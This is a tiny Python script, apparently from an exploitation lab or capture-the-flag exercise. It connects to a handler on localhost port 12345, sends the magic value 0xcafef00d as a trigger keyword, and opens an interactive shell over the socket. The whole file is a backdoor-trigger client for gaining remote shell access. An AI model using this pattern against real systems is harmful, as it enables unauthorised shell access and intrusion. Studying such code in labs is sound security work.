#!/usr/bin/env python

"""
run handler then run this
"""

from isis import *

MAGIC_CONSTANT=0xcafef00d
s=getSocket(("localhost",12345))
keyword=pack("I",MAGIC_CONSTANT)
s.send(keyword);
shell(s)
